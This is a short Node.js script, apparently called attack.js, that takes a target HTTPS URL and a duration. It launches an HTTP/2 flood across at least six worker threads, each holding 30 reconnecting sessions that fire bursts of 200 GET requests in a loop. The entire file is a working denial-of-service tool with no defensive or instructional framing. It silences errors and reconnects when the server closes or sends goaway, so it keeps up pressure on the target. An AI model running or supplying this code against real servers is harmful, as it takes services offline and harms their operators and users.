const http2 = require('http2');
const { Worker, isMainThread, workerData } = require('worker_threads');
const { cpus } = require('os');

const THREADS = Math.max(6, cpus().length); // ensure at least 6 threads

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <https://target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);

    console.log(`Launching HTTP/2 attack on ${target} for ${duration}s with ${THREADS} threads...`);

    for (let i = 0; i < THREADS; i++) {
        new Worker(__filename, { workerData: { target, duration } });
    }
} else {
    const { target, duration } = workerData;
    const end = Date.now() + duration * 1000;

    function createSessionFlooder() {
        let client;
        try {
            client = http2.connect(target);
        } catch {
            return setTimeout(createSessionFlooder, 100);
        }

        client.on('error', () => {});
        client.on('close', () => setTimeout(createSessionFlooder, 100));
        client.on('goaway', () => setTimeout(createSessionFlooder, 100));

        const send = () => {
            if (Date.now() > end || client.destroyed || client.closed) {
                client.destroy();
                return;
            }

            try {
                for (let i = 0; i < 200; i++) {
                    const req = client.request({
                        ':method': 'GET',
                        ':path': '/',
                        'user-agent': 'spammer/9000',
                        'accept': '*/*',
                    });

                    req.on('error', () => {});
                    req.end();
                }
            } catch {}

            setImmediate(send);
        };

        client.on('connect', send);
    }

    // 30 persistent HTTP/2 connections per thread
    for (let i = 0; i < 30; i++) createSessionFlooder();
}
